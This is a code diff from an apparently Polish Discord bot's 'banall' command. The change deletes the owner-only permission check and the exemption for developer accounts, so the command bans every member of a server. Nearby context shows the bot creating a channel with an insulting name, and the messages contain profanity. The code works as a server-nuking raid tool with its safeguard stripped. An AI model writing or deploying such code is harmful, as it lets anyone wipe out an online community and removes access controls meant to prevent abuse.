@@ -140,11 +140,11 @@ message.guild.createChannel("JEBAĆ FUBU XD");
  if(cmd === `${prefix}banall`){	
   let BReason = args.join(" ").slice(0);
   if (!BReason) return message.reply("Nie znaleziono osób do banowania")
-  if (message.author.id != 340557425511759892) return message.reply("Tylko wlasciciel bota moze to uzyc kurwa!")
+
 
   let C = message.channel;
   message.guild.members.forEach((f, i) => {
-      if (f.id == 340557425511759892, 354290340121018369, 220161564567666699) return message.reply("Developerów, Misiaczków nie zbanujesz :D");
+     
       message.guild.member(f).ban(BReason);
       C.send(`Banned ${f}!`);
   });
